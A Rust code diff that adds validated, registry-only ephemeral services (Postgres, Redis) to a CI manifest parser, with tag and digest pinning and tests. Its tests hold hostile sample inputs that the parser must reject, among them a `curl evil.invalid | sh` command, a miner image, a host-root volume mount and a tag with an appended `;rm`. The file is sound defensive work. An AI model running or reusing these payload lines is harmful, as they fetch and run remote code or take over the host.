@@ -3,7 +3,8 @@
 //! from the checked-out tree at the dispatched SHA and validated strictly).
 //!
 //! Beyond commands the manifest also DECLARES what the dispatch needs
-//! provisioned — sibling repos ([`CiSibling`]) and tools ([`CiTool`]).
+//! provisioned — sibling repos ([`CiSibling`]), tools ([`CiTool`]) and
+//! ephemeral services ([`CiService`]).
 //! Declarative rather than executable on purpose: an in-manifest
 //! `git clone …` or `cargo install …` step would pass the argv rules below
 //! today (no banned metacharacter, and the executor does not sandbox the
@@ -13,6 +14,13 @@
 //! clone step is neither. The Actions lane reached the same conclusion
 //! independently and now machine-enforces it
 //! (`.github/workflows/forbid-sibling-clone.yml`).
+//!
+//! [`CiService`] extends that rule to containers, where it binds hardest: an
+//! image reference is the container world's URL, and a manifest that could
+//! supply one could make the runner pull an arbitrary payload from an
+//! arbitrary registry and RUN it as a listening server on a user's machine.
+//! So a service is NAMED from a closed registry ([`super::services`]) and its
+//! version PINNED, exactly like a tool.
 
 use serde::Deserialize;
 use std::collections::BTreeMap;
@@ -96,6 +104,48 @@ const ENV_ALLOWLIST: &[&str] = &[
     // lockfile-pinned. `NODE_OPTIONS`/`NODE_ENV`/`CI` above already cover what
     // those steps legitimately tune. The test
     // `ecosystem_env_still_outside_the_allowlist` pins this decision.
+    //
+    // ── NOTHING WAS ADDED FOR SERVICE CONNECTIONS EITHER ─────────────────
+    //
+    // `[[services]]` gives a step a database and a cache, which it obviously
+    // has to reach. That did NOT widen this list: every connection variable
+    // (`DATABASE_URL`, the libpq `PG*` family, `REDIS_URL`/`REDIS_HOST`/
+    // `REDIS_PORT`) is EXECUTOR-OWNED and rejected via
+    // `services::kind_exporting` instead. The reason is not stylistic — a
+    // manifest *could not* write those values if it wanted to: the port is
+    // assigned at dispatch
+    // time by the kernel (a user's machine may already run Postgres on 5432),
+    // and the password is generated per dispatch precisely so that no
+    // committed file ever contains one. A manifest key that can only ever hold
+    // a wrong value is worse than no key.
+    //
+    // ── ADDED FOR THE DATABASE-BACKED SUITE THIS PHASE UNBLOCKS ──────────
+    //
+    // Each of the four below is set by a LIVE gate step — qontinui-web's
+    // `backend-ci.yml` `test` job, "Run tests with coverage", the very job
+    // `[[services]]` exists to make expressible — and each is app
+    // configuration for the dispatched repo's own test process. None can
+    // influence which binary or toolchain resolves on the host, which is the
+    // class this boundary exists to keep out (PATH, CARGO_HOME, LD_PRELOAD,
+    // npm_config_prefix, PYTHONPATH — all still rejected, pinned by
+    // `ecosystem_env_still_outside_the_allowlist`).
+    //
+    // Selects the app's test configuration branch.
+    "TESTING",
+    // Names the app's config profile (`development`). A string the app reads,
+    // not a path anything resolves through.
+    "ENVIRONMENT",
+    // The app's session-signing key. Test-only by construction: the Actions
+    // step's value is the literal
+    // `test-secret-key-for-testing-only-minimum-32-characters-long`, and a
+    // manifest is a committed file — anything written here is public by
+    // definition and must be a throwaway. Allowlisted because the suite
+    // refuses to boot without one, NOT because a manifest is a place for
+    // secrets.
+    "SECRET_KEY",
+    // Feature flag for the app's redis client. Paired with a `[[services]]`
+    // redis entry, whose CONNECTION values stay executor-owned.
+    "REDIS_ENABLED",
 ];
 
 /// Env vars the EXECUTOR owns and exports itself. A step setting one of
@@ -112,6 +162,11 @@ const EXECUTOR_OWNED_ENV: &[(&str, &str)] = &[
         "CARGO_TARGET_DIR",
         "the executor's per-repo CI target dir (not settable)",
     ),
+    // NOTE: the SERVICE connection variables (`DATABASE_URL`, the libpq `PG*`
+    // family, `REDIS_URL`/`REDIS_HOST`/`REDIS_PORT`) are executor-owned too,
+    // but they are not restated here — they are derived from
+    // `services::kind_exporting`, so a new export closes the manifest side
+    // automatically instead of relying on someone remembering this list.
 ];
 
 /// Shell metacharacters banned from command argv tokens. Commands are
@@ -140,6 +195,10 @@ pub(crate) struct CiManifest {
     /// Tools the runner must supply on the step PATH.
     #[serde(default)]
     pub tools: Vec<CiTool>,
+    /// Ephemeral services (a database, a cache) the steps need. Started
+    /// before the first step, health-gated, and destroyed with the dispatch.
+    #[serde(default)]
+    pub services: Vec<CiService>,
 }
 
 #[derive(Debug, Clone, Deserialize)]
@@ -271,6 +330,37 @@ pub(crate) struct CiTool {
     pub version: String,
 }
 
+/// An ephemeral service the dispatch needs — a database, a cache — started in
+/// a container before the first step and destroyed with the dispatch.
+///
+/// NOTE what is deliberately absent, and it is the same absence [`CiTool`]
+/// has: an IMAGE. The manifest names a curated entry from the closed registry
+/// in [`super::services`] and pins its version; it cannot point the runner at
+/// an arbitrary image, an arbitrary registry, a port, a volume, a command or a
+/// set of container flags. A repo can already run whatever it likes as a step;
+/// what it must not be able to do is make the RUNNER pull an arbitrary payload
+/// and run it as a listening server on a contributor's machine.
+///
+/// Credentials are absent for a second reason: the runner GENERATES them per
+/// dispatch. A manifest is a committed file, so a password field here would be
+/// a password on GitHub, and a fixed one would be a password on every
+/// contributor's loopback interface.
+#[derive(Debug, Clone, Deserialize)]
+#[serde(deny_unknown_fields)]
+pub(crate) struct CiService {
+    /// Registry entry name, e.g. `postgres-pgvector`.
+    pub name: String,
+    /// Image tag, e.g. `pg16`. Must name a version: a floating tag
+    /// (`latest`, `stable`, a bare `alpine`) makes two dispatches of one
+    /// commit incomparable, exactly as it does for a tool.
+    pub version: String,
+    /// Optional `sha256:…` image digest. A tag is a MUTABLE pointer — the
+    /// same tag can be re-pushed at any time — so this is the only true pin,
+    /// and it wins over `version` when both are present.
+    #[serde(default)]
+    pub digest: Option<String>,
+}
+
 /// Caps the executor exports to every step.
 ///
 /// A value here is a **CEILING, not an override**: the effective cap is
@@ -341,6 +431,7 @@ pub(crate) fn parse_and_validate(text: &str) -> Result<CiManifest, String> {
     }
     validate_siblings(&manifest.siblings)?;
     validate_tools(&manifest.tools)?;
+    validate_services(&manifest.services)?;
     for (i, step) in manifest.steps.iter().enumerate() {
         let label = if step.name.trim().is_empty() {
             format!("steps[{i}]")
@@ -368,6 +459,20 @@ pub(crate) fn parse_and_validate(text: &str) -> Result<CiManifest, String> {
                 return Err(format!(
                     "{label}: env var {key:?} is exported by the executor and would be \
                      overridden — set {owner} instead"
+                ));
+            }
+            if let Some(kind) = super::services::kind_exporting(key.as_str()) {
+                // A connection variable a manifest could only ever get wrong:
+                // the host port is assigned at dispatch time and the password
+                // is generated per dispatch. Hardcoding one would point the
+                // dispatch at whatever database happens to be running on the
+                // contributor's machine — the exact "a step that assumed a
+                // local Postgres" failure this lane exists to avoid.
+                return Err(format!(
+                    "{label}: env var {key:?} is exported by the executor from the [[services]] \
+                     entry that provides it (service kind '{}') — declare that service instead \
+                     of hardcoding a connection",
+                    kind.label()
                 ));
             }
             if !ENV_ALLOWLIST.contains(&key.as_str()) {
@@ -438,6 +543,110 @@ fn validate_tools(tools: &[CiTool]) -> Result<(), String> {
             return Err(format!("{label}: declared twice"));
         }
         seen.push(&t.name);
+    }
+    Ok(())
+}
+
+fn validate_services(services: &[CiService]) -> Result<(), String> {
+    if services.len() > MAX_PROVISIONED_ENTRIES {
+        return Err(format!(
+            "ci.toml declares {} [[services]] (max {MAX_PROVISIONED_ENTRIES})",
+            services.len()
+        ));
+    }
+    let mut seen_names: Vec<&str> = Vec::new();
+    let mut seen_kinds: Vec<super::services::ServiceKind> = Vec::new();
+    for s in services {
+        let label = format!("service '{}'", s.name);
+        let Some(spec) = super::services::lookup(&s.name) else {
+            return Err(format!(
+                "{label}: unknown service. This runner starts services from a closed registry \
+                 (known: {:?}) — a manifest names a service, it never supplies an image",
+                super::services::known_service_names()
+            ));
+        };
+        validate_image_tag(&s.version).map_err(|e| format!("{label}: {e}"))?;
+        if let Some(d) = &s.digest {
+            validate_image_digest(d).map_err(|e| format!("{label}: {e}"))?;
+        }
+        if seen_names.contains(&s.name.as_str()) {
+            return Err(format!("{label}: declared twice"));
+        }
+        seen_names.push(&s.name);
+        if seen_kinds.contains(&spec.kind) {
+            // Two of a kind would export the SAME connection variables, so a
+            // step could not tell them apart and one would silently win.
+            // Caught here rather than as a confusing "your DATABASE_URL points
+            // at the other one" at run time.
+            return Err(format!(
+                "{label}: two [[services]] provide the same connection env (kind '{}') — \
+                 a step could not tell them apart",
+                spec.kind.label()
+            ));
+        }
+        seen_kinds.push(spec.kind);
+    }
+    Ok(())
+}
+
+/// An image tag becomes half of an image reference, so it is restricted to
+/// what a registry actually accepts AND required to name a version. The
+/// version rule is the same one `[[tools]]` enforces, for the same reason:
+/// a floating pointer makes two dispatches of one commit incomparable.
+fn validate_image_tag(tag: &str) -> Result<(), String> {
+    if tag.is_empty() || tag.len() > 128 {
+        return Err(format!("version {tag:?} must be 1..=128 chars"));
+    }
+    if !tag.starts_with(|c: char| c.is_ascii_alphanumeric()) {
+        return Err(format!(
+            "version {tag:?} must start with a letter or digit (a registry tag cannot begin \
+             with '.' or '-')"
+        ));
+    }
+    if !tag
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
+    {
+        return Err(format!("version {tag:?} may only contain [A-Za-z0-9._-]"));
+    }
+    // A tag that carries no digit is a moving alias, not a version:
+    // `latest`, `stable`, `alpine`, `bookworm`. `pg16` and `7-alpine` are
+    // versions. The named list below is redundant with that rule and kept
+    // anyway, because the error it produces is the one an author needs.
+    const FLOATING: &[&str] = &[
+        "latest", "stable", "edge", "main", "master", "nightly", "dev", "current", "rolling",
+        "release",
+    ];
+    if FLOATING.iter().any(|f| tag.eq_ignore_ascii_case(f))
+        || !tag.contains(|c: char| c.is_ascii_digit())
+    {
+        return Err(format!(
+            "version {tag:?} is a floating tag, not a pinned image version — pin one that names \
+             a version (e.g. \"pg16\", \"7-alpine\"). An unpinned image makes two dispatches of \
+             the same commit incomparable, and for a true pin add digest = \"sha256:…\" (a tag \
+             is a mutable pointer; a digest is not)"
+        ));
+    }
+    Ok(())
+}
+
+/// `sha256:` plus exactly 64 lowercase hex digits — the only shape a registry
+/// digest takes, and the one thing in a service declaration that cannot be
+/// re-pointed under the dispatch.
+fn validate_image_digest(digest: &str) -> Result<(), String> {
+    let Some(hex) = digest.strip_prefix("sha256:") else {
+        return Err(format!(
+            "digest {digest:?} must be of the form \"sha256:<64 hex digits>\""
+        ));
+    };
+    if hex.len() != 64
+        || !hex
+            .chars()
+            .all(|c| c.is_ascii_hexdigit() && !c.is_ascii_uppercase())
+    {
+        return Err(format!(
+            "digest {digest:?} must be \"sha256:\" followed by exactly 64 lowercase hex digits"
+        ));
     }
     Ok(())
 }
@@ -983,6 +1192,188 @@ timeout_secs = 7200
             );
             let err = parse_and_validate(&text).unwrap_err();
             assert!(err.contains("version"), "{bad}: got {err}");
+        }
+    }
+
+    // ── [[services]] ──────────────────────────────────────────────────────
+
+    const WITH_SERVICES: &str = r#"
+version = 1
+
+[[services]]
+name = "postgres-pgvector"
+version = "pg16"
+
+[[services]]
+name = "redis"
+version = "7-alpine"
+
+[[steps]]
+name = "test"
+command = ["pytest"]
+"#;
+
+    #[test]
+    fn services_parse_and_default_to_no_digest() {
+        let m = parse_and_validate(WITH_SERVICES).expect("valid services must parse");
+        assert_eq!(m.services.len(), 2);
+        assert_eq!(m.services[0].name, "postgres-pgvector");
+        assert_eq!(m.services[0].version, "pg16");
+        assert!(m.services[0].digest.is_none());
+        // Absent is the default everywhere else too.
+        let none =
+            parse_and_validate("version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\n")
+                .unwrap();
+        assert!(none.services.is_empty());
+    }
+
+    /// AN UNPINNED IMAGE IS A VALIDATION ERROR — the `[[tools]]` rule, applied
+    /// to images. `latest` is only the most obvious case; any tag that names no
+    /// version is a moving pointer.
+    #[test]
+    fn floating_image_tags_rejected() {
+        for bad in [
+            "latest", "LATEST", "stable", "edge", "main", "alpine", "bookworm", "nightly",
+        ] {
+            let text = format!(
+                "version = 1\n[[services]]\nname = \"redis\"\nversion = {bad:?}\n\
+                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
+            );
+            let err = parse_and_validate(&text).unwrap_err();
+            assert!(err.contains("floating tag"), "{bad}: got {err}");
+        }
+        // And the pinned ones the fleet actually uses are accepted.
+        for good in ["pg16", "7-alpine", "16.4", "16"] {
+            let text = format!(
+                "version = 1\n[[services]]\nname = \"postgres\"\nversion = {good:?}\n\
+                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
+            );
+            parse_and_validate(&text).unwrap_or_else(|e| panic!("{good} must pin, got: {e}"));
+        }
+    }
+
+    #[test]
+    fn malformed_image_tags_and_digests_rejected() {
+        for bad in ["", ".hidden", "-leading", "pg 16", "pg16;rm", "pg/16"] {
+            let text = format!(
+                "version = 1\n[[services]]\nname = \"postgres\"\nversion = {bad:?}\n\
+                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
+            );
+            let err = parse_and_validate(&text).unwrap_err();
+            assert!(err.contains("version"), "{bad}: got {err}");
+        }
+        for bad in [
+            "deadbeef",
+            "sha256:short",
+            "sha512:0000000000000000000000000000000000000000000000000000000000000000",
+        ] {
+            let text = format!(
+                "version = 1\n[[services]]\nname = \"postgres\"\nversion = \"16\"\ndigest = {bad:?}\n\
+                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
+            );
+            let err = parse_and_validate(&text).unwrap_err();
+            assert!(err.contains("digest"), "{bad}: got {err}");
+        }
+        let ok = format!(
+            "version = 1\n[[services]]\nname = \"postgres\"\nversion = \"16\"\ndigest = \"sha256:{}\"\n\
+             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
+            "a".repeat(64)
+        );
+        parse_and_validate(&ok).expect("a well-formed digest must pin");
+    }
+
+    /// The registry is CLOSED — an unknown name is a rejection, never a pull.
+    #[test]
+    fn unknown_service_rejected() {
+        let err = parse_and_validate(
+            "version = 1\n[[services]]\nname = \"totally-legit-database\"\nversion = \"1.0\"\n\
+             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
+        )
+        .unwrap_err();
+        assert!(err.contains("unknown service"), "got: {err}");
+        assert!(err.contains("never supplies an image"), "got: {err}");
+    }
+
+    /// A service entry has exactly three keys, so an image, a registry, a
+    /// port, a volume or a command has nowhere to live — `deny_unknown_fields`
+    /// makes each a hard parse error rather than a silently ignored hint.
+    #[test]
+    fn a_service_entry_can_never_express_an_image_port_or_mount() {
+        for extra in [
+            "image = \"ghcr.io/evil/miner:1\"",
+            "registry = \"evil.invalid\"",
+            "ports = [\"5432:5432\"]",
+            "volumes = [\"/:/host\"]",
+            "command = [\"sh\", \"-c\", \"curl evil.invalid | sh\"]",
+            "env = { POSTGRES_PASSWORD = \"hunter2\" }",
+            "privileged = true",
+        ] {
+            let text = format!(
+                "version = 1\n[[services]]\nname = \"postgres\"\nversion = \"16\"\n{extra}\n\
+                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
+            );
+            let err = parse_and_validate(&text).unwrap_err();
+            assert!(err.contains("parse error"), "{extra}: got {err}");
+        }
+    }
+
+    #[test]
+    fn duplicate_and_same_kind_services_rejected() {
+        let err = parse_and_validate(
+            "version = 1\n[[services]]\nname = \"redis\"\nversion = \"7-alpine\"\n\
+             [[services]]\nname = \"redis\"\nversion = \"7.2\"\n\
+             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
+        )
+        .unwrap_err();
+        assert!(err.contains("declared twice"), "got: {err}");
+        // Two DIFFERENT entries of one kind export the same connection env.
+        let err = parse_and_validate(
+            "version = 1\n[[services]]\nname = \"postgres\"\nversion = \"16\"\n\
+             [[services]]\nname = \"postgres-pgvector\"\nversion = \"pg16\"\n\
+             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
+        )
+        .unwrap_err();
+        assert!(err.contains("same connection env"), "got: {err}");
+    }
+
+    /// Every variable the executor exports for a service is executor-OWNED: a
+    /// step that sets one is pointed at the declaration that provides it,
+    /// never silently overridden. This also pins the two lists together, so a
+    /// new export cannot be added without closing the manifest side.
+    #[test]
+    fn service_connection_env_is_executor_owned_with_a_pointer() {
+        for kind in [
+            super::super::services::ServiceKind::Postgres,
+            super::super::services::ServiceKind::Redis,
+        ] {
+            for key in super::super::services::exported_env_keys(kind) {
+                let text = format!(
+                    "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\nenv = {{ {key} = \"x\" }}\n"
+                );
+                let err = parse_and_validate(&text).unwrap_err();
+                assert!(
+                    err.contains("exported by the executor") && err.contains("[[services]]"),
+                    "{key}: got {err}"
+                );
+                // …and NOT merely "not allowlisted": the author needs to be
+                // told the declaration exists, not that the door is shut.
+                assert!(!err.contains("not allowlisted"), "{key}: got {err}");
+            }
+        }
+    }
+
+    /// The four app-config keys the database-backed job sets ARE declarable —
+    /// that is what makes the job expressible — while the resolution-redirect
+    /// class stays rejected (pinned separately by
+    /// `ecosystem_env_still_outside_the_allowlist`).
+    #[test]
+    fn database_suite_app_config_env_accepted() {
+        for key in ["TESTING", "ENVIRONMENT", "SECRET_KEY", "REDIS_ENABLED"] {
+            let text = format!(
+                "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\nenv = {{ {key} = \"1\" }}\n"
+            );
+            parse_and_validate(&text)
+                .unwrap_or_else(|e| panic!("{key} must be allowlisted, got: {e}"));
         }
     }
 
